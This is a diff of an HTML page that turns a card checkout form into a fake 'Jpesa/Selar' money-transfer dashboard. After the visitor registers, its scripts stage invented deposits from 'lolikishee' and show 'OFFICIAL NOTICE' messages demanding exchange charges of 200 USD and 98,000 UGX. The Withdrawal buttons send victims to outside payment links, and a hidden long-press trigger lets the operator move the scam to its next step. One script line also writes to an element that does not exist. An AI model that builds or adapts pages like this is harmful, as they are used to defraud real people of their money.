@@ -3,164 +3,278 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Card Payment</title>
+    <title>Jpesa Transaction System - KUWAIT Theme</title>
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
+        :root {
+            --jpesa-blue: #1a73e8;
+            --jpesa-red: #d93025;
+            --bg-light: #f1f3f4;
+            --dark-text: #202124;
+            --border-gray: #dadce0;
+            --success-green: #00a65a;
+            --selar-brown: #8b4513;
+        }
+
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f4f7f6;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+            background-color: var(--bg-light);
             margin: 0;
-        }
-
-        .payment-container {
-            background: #fff;
-            padding: 25px;
-            border-radius: 12px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
-            width: 100%;
-            max-width: 400px;
-        }
-
-        h2 {
-            font-size: 1.2rem;
-            color: #333;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-
-        .card-icons {
             display: flex;
             justify-content: center;
-            gap: 15px;
-            margin-bottom: 20px;
+            min-height: 100vh;
         }
 
-        .input-group {
-            margin-bottom: 15px;
-        }
-
-        label {
-            display: block;
-            font-size: 0.85rem;
-            color: #666;
-            margin-bottom: 5px;
-        }
-
-        input[type="text"] {
+        .container {
+            background: white;
             width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            box-sizing: border-box;
-            font-size: 1rem;
+            max-width: 500px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            position: relative;
+            overflow: hidden;
         }
 
-        .btn-pay {
-            width: 100%;
-            background-color: #1a1f71; 
+        .top-banner {
+            height: 60px;
+            background: linear-gradient(90deg, #ffffff 0%, #1a73e8 70%, #8ab4f8 100%);
+            display: flex;
+            align-items: center;
+            padding: 0 15px;
+        }
+
+        .header-content { text-align: right; padding: 20px; }
+        .jpesa-title { color: var(--jpesa-red); font-size: 1.2rem; font-weight: bold; margin: 0; }
+        .jpesa-sub { font-size: 0.7rem; color: #555; line-height: 1.2; }
+
+        .bank-logo { color: var(--jpesa-blue); font-size: 60px; margin: 20px; text-align:center; }
+
+        .form-section { padding: 0 30px 30px; }
+        
+        /* Modified header colors per instructions */
+        .header-login { background: var(--selar-brown); color: white; padding: 8px; font-weight: bold; letter-spacing: 2px; text-align: center; margin: 20px 0; }
+        .header-dash { background: var(--success-green); color: white; padding: 8px; font-weight: bold; letter-spacing: 2px; text-align: center; margin: 20px 0; }
+        
+        .field { margin-bottom: 15px; text-align: left; }
+        label { display: block; font-size: 0.75rem; font-weight: bold; color: #666; text-transform: uppercase; margin-bottom: 4px; }
+        input { width: 100%; padding: 12px; border: 1px solid var(--border-gray); border-radius: 4px; box-sizing: border-box; background: #fafafa; }
+
+        .btn-action {
+            background: var(--success-green);
             color: white;
-            padding: 14px;
             border: none;
-            border-radius: 6px;
-            font-size: 1rem;
+            width: 100%;
+            padding: 15px;
+            border-radius: 30px;
             font-weight: bold;
             cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
             margin-top: 10px;
         }
 
-        .secure-notice {
-            font-size: 0.75rem;
-            color: #999;
-            text-align: center;
+        .receipt-card {
+            border: 1px solid var(--border-gray);
+            padding: 15px;
+            position: relative;
+            background: #fff;
             margin-top: 15px;
         }
+
+        @keyframes blinker { 50% { opacity: 0; } }
+        .blink-green { color: var(--success-green); font-weight: bold; animation: blinker 1s linear infinite; }
+        .live-tag { color: var(--success-green); font-weight: bold; font-size: 0.7rem; animation: blinker 1.5s linear infinite; margin-left: 5px; }
+
+        .payment-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin: 20px 0; }
+        .pay-box { border: 1px solid var(--border-gray); border-radius: 8px; padding: 10px; text-align: center; font-size: 0.7rem; font-weight: bold; background: #fff; }
+        
+        .color-stripe { color: var(--jpesa-blue); cursor: pointer; }
+        .color-epay { color: var(--success-green); cursor: pointer; }
+
+        /* Loading Bar Styles */
+        .progress-container { width: 100%; background-color: #ddd; border-radius: 10px; margin: 15px 0; height: 10px; }
+        .progress-bar { width: 0%; height: 100%; background-color: var(--success-green); border-radius: 10px; transition: width 0.1s linear; }
+
+        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; justify-content: center; align-items: center; padding: 20px; }
+        .modal { background: white; padding: 25px; border-radius: 8px; max-width: 400px; width: 100%; text-align: center; }
+
+        .loading-ring { border: 4px solid #f3f3f3; border-top: 4px solid var(--jpesa-blue); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 10px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .user-info-header { font-weight: bold; color: var(--dark-text); margin-bottom: 5px; text-transform: uppercase; border-bottom: 1px solid #eee; padding-bottom: 5px; }
     </style>
 </head>
 <body>
 
-<div class="payment-container">
-    <h2>Secure Card Checkout</h2>
-    
-    <div class="card-icons">
-        <span style="font-weight: bold; color: #1a1f71;">VISA</span>
-        <span style="font-weight: bold; color: #eb001b;">MASTERCARD</span>
+<div class="container" id="app">
+    <div class="top-banner">
+        <div style="background: white; padding: 5px; border-radius: 4px; display: flex; align-items: center;">
+            <span style="color:#0033a0; font-weight:bold; font-size: 10px;">Selar visa MasterCard Invoice</span>
+        </div>
     </div>
 
-    <form name="JPesa" method="post" action="https://my.jpesa.com/?dad=xp">
-        <input type="hidden" name="ownerid" value="wasswa.lawrence" />
-        <input type="hidden" name="description" value="Credit Note" />
-        <input type="hidden" name="return" value="https://my.jpesa.com" />
-        <input type="hidden" name="cancel" value="https://my.jpesa.com" />
+    <div class="header-content">
+        <p class="jpesa-title">Selar invoice International</p>
+        <p class="jpesa-sub">Plot Z, Kuwait City, Polyn Street Road<br>P.O. Box 25630 - Kuwait <br>+1-Kuwait</p>
+    </div>
+
+    <div id="loginPage" class="form-section">
+        <div class="bank-logo">🏛️</div>
+        <div class="header-login">JPESA ACCOUNT</div>
         
-        <input type="hidden" name="method" value="card" />
-        <input type="hidden" name="cur" value="UGX" />
-        <input type="hidden" name="amount" value="21670" />
-
-        <div class="input-group">
-            <label>Cardholder Name</label>
-            <input type="text" name="customer_name" placeholder="Name on card" required>
+        <div class="field"><label>Legal Full Name</label><input type="text" id="regName" placeholder=""></div>
+        <div class="field"><label>Account Number to Deposited onto</label><input type="text" id="regPhone" placeholder=""></div>
+        <div class="field"><label>Email Address</label><input type="email" id="regEmail" placeholder=""></div>
+        <div style="display:flex; gap:10px;">
+            <div class="field" style="flex:1;"><label>Password</label><input type="password" placeholder="******"></div>
+            <div class="field" style="flex:1;"><label>Confirm</label><input type="password" placeholder="******"></div>
         </div>
+        <button class="btn-action" onclick="register()">OPEN YOUR JPESA ACCOUNT</button>
+    </div>
 
-        <div class="input-group">
-            <label>Card Number</label>
-            <input type="text" placeholder="0000 0000 0000 0000" maxlength="19">
-        </div>
-
-        <div style="display: flex; gap: 10px;">
-            <div class="input-group" style="flex: 1;">
-                <label>Expiry</label>
-                <input type="text" placeholder="MM/YY" maxlength="5">
-            </div>
-            <div class="input-group" style="flex: 1;">
-                <label>CVV</label>
-                <input type="text" placeholder="123" maxlength="3">
-            </div>
-        </div>
-
-        <input type="submit" class="btn-pay" value="Pay Now">
+    <div id="dashboard" class="form-section" style="display:none;">
+        <div class="header-dash">JPESA ACCOUNT</div>
         
-        <div class="secure-notice">
-            &#128274; Secure SSL Checkout
+        <div id="userInfoDisplay" class="user-info-header"></div>
+        
+        <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; border-left: 5px solid var(--jpesa-blue);">
+            <div style="font-size: 0.8rem; color: #666;">AVAILABLE BALANCE</div>
+            <div id="KWDBalance" style="font-size: 1.8rem; font-weight: bold; color: var(--jpesa-blue);">0.00KWD</div>
+            <div style="font-size: 1rem;">Exact: <span id="usdBalance" class="blink-green">0.00$</span></div>
         </div>
-    </form>
+
+        <div id="mainNotif" class="receipt-card">
+            <p id="notifText" style="font-size: 0.85rem; color: #444; margin: 0;"></p>
+        </div>
+
+        <div style="display:flex; gap:10px; margin-top:15px;">
+            <button class="btn-action" style="margin:0; background: var(--jpesa-blue);" onclick="handleAction()">Withdrawal</button>
+            <button class="btn-action" style="margin:0; background: #444;" onclick="handleAction()">Receive</button>
+        </div>
+
+        <div class="payment-grid">
+            <div class="pay-box" style="color: red; cursor: not-allowed;">AIRTEL</div>
+            <div class="pay-box" style="cursor: not-allowed;"><span style="color: blue;">MTN</span> <span style="color: #ffd700;">MOMO</span></div>
+            <div class="pay-box color-stripe">STRIPE</div>
+            <div class="pay-box color-epay" id="epaySpecial" onmousedown="startEpayLong()" onmouseup="endEpayLong()">EPAY</div>
+        </div>
+
+        <div id="recentActivity" class="receipt-card" style="border-top: 3px solid var(--success-green);">
+            <div style="display:flex; align-items:center; margin-bottom: 10px;">
+                <label style="margin:0;">Recent Activity</label>
+                <span class="live-tag">LIVE</span>
+            </div>
+            <div id="activityLog" style="color: var(--jpesa-blue); font-weight: bold; font-size: 0.95rem; background: #f0fdf4; padding: 10px; border-radius: 5px;">No transactions</div>
+        </div>
+    </div>
 </div>
+
+<div id="overlay" class="overlay">
+    <div class="modal" id="modalContent"></div>
+</div>
+
 <script>
-    document.getElementById('paymentForm').addEventListener('submit', function(e) {
-        e.preventDefault(); // Prevents the page from redirecting
+    let state = JSON.parse(localStorage.getItem('selarStateChicago')) || { step: 0, name: '', phone: '' };
+    let longTimer;
 
-        const form = this;
-        const btn = document.getElementById('submitBtn');
-        const notice = document.getElementById('processing-notice');
-        const mobileInput = document.getElementById('mobile');
+    window.onload = () => { if(state.step > 0) renderStep(); };
+
+    function save() { localStorage.setItem('selarStateChicago', JSON.stringify(state)); }
+
+    function register() {
+        state.name = document.getElementById('regName').value;
+        state.phone = document.getElementById('regPhone').value;
         
-        // Disable inputs and show loading state
-        btn.disabled = true;
-        btn.innerText = "Please wait...";
-        mobileInput.readOnly = true;
-        notice.style.display = "block";
+        // Account Loading Notification
+        const ov = document.getElementById('overlay');
+        ov.style.display = 'flex';
+        document.getElementById('modalContent').innerHTML = `
+            <h3>Your Selar account loading</h3>
+            <div class="progress-container"><div id="regProgress" class="progress-bar"></div></div>
+            <p id="progText">0%</p>
+        `;
 
-        // Create the data to send
-        const formData = new FormData(form);
+        let width = 0;
+        let progBar = document.getElementById('regProgress');
+        let progText = document.getElementById('progText');
+        
+        let interval = setInterval(() => {
+            if (width >= 100) {
+                clearInterval(interval);
+                ov.style.display = 'none';
+                state.step = 1;
+                save();
+                renderStep();
+                setTimeout(() => { if(state.step === 1) showDepositModal(200); }, 11000);
+            } else {
+                width += 2; // Increments over 5 seconds (approx)
+                progBar.style.width = width + '%';
+                progText.innerText = width + '%';
+            }
+        }, 100);
+    }
 
-        // Send the request in the background
-        fetch('https://my.jpesa.com/?dad=xp', {
-            method: 'POST',
-            body: formData,
-            mode: 'no-cors' // This allows the request to be sent to a different domain silently
-        })
-        .then(() => {
-            // Because of 'no-cors', we won't see the response body, 
-            // but the request has been successfully dispatched to Jpesa.
-            console.log("Background payment request sent.");
-        })
-        .catch(error => {
-            console.error("Submission error:", error);
-            btn.innerText = "Retry";
-            btn.disabled = false;
-        });
-    });
+    function renderStep() {
+        document.getElementById('loginPage').style.display = 'none';
+        document.getElementById('dashboard').style.display = 'block';
+        document.getElementById('userInfoDisplay').innerText = `${state.name} | ${state.phone}`;
+
+        if(state.step === 1) {
+             document.getElementById('notifText').innerHTML = "Successfully registered your SIM Card on Selar system. Send/Receive globally.";
+        }
+
+        if(state.step === 2) {
+            document.getElementById('KWDBalance').innerText = "1,800KWD";
+            document.getElementById('usdBalance').innerText = "$5,845";
+            document.getElementById('notifText').innerHTML = `<span style="color: #1a73e8; font-weight: bold;">OFFICIAL NOTICE:</span> Your Account doesn't support KWD deposit. Recharge your Visa, MasterCard with exchange charge of <b style="color: var(--jpesa-red);">200USD</b>. Click withdrawal and use your visa, or MasterCard to initiate foreign exchange charge for 1800KWD.`;
+            document.getElementById('activityLog').innerText = "Received 1800.00KWD from lolikishee, Kuwait";
+        }
+
+        if(state.step === 3) {
+            document.getElementById('notifText').innerHTML = `<b>PAID!</b> Foreign exchange charge 58,000UGX.`;
+            document.querySelectorAll('.btn-action').forEach(b => b.onclick = null);
+        }
+
+        if(state.step === 4) {
+            document.getElementById('ugxBalance').innerText = "2,906,702.40UGX";
+            document.getElementById('usdBalance').innerText = "800.00$";
+            document.getElementById('notifText').innerHTML = `<span style="color: #1a73e8; font-weight: bold;">OFFICIAL NOTICE:</span> Exchange charge needed <b style="color: var(--jpesa-red);">98,000UGX</b> to allow 800$ into UGX. Click withdrawal and fill 07XXXXX.`;
+            document.getElementById('activityLog').innerText = "Received 800.00$ from lolikishee, USA";
+        }
+    }
+
+    function showDepositModal(amount) {
+        const ov = document.getElementById('overlay');
+        ov.style.display = 'flex';
+        document.getElementById('modalContent').innerHTML = `
+            <h3>Deposit Detected</h3>
+            <p>Amount: <b>${amount}.00$</b><br>Sender: lolikishee (A001112)<br>Address: USA CHICAGO</p>
+            <button class="btn-action" onclick="confirmDeposit(${amount})">CONFIRM TRANSACTION</button>
+        `;
+    }
+
+    function confirmDeposit(amt) {
+        document.getElementById('modalContent').innerHTML = `<div class="loading-ring"></div><p>Always confirm any Transaction invoice on Your Selar account for safety.</p>`;
+        setTimeout(() => {
+            document.getElementById('overlay').style.display = 'none';
+            state.step = (amt === 200) ? 2 : 4;
+            save(); renderStep();
+        }, 6000);
+    }
+
+    function handleAction() {
+        if(state.step === 3) return;
+        window.location.href = state.step >= 4 ? "https://pay.guto.app/@selara4?a=98000" : "https://lolisys.github.io/5selar/";
+    }
+
+    function startEpayLong() {
+        if(state.step !== 3) return;
+        longTimer = setTimeout(() => {
+            document.getElementById('overlay').style.display = 'flex';
+            document.getElementById('modalContent').innerHTML = `<div class="loading-ring"></div><p>Configuring 800$ deposit from A001112...</p>`;
+            setTimeout(() => showDepositModal(800), 11000);
+        }, 5000);
+    }
+
+    function endEpayLong() { clearTimeout(longTimer); }
+</script>
 </body>
 </html>
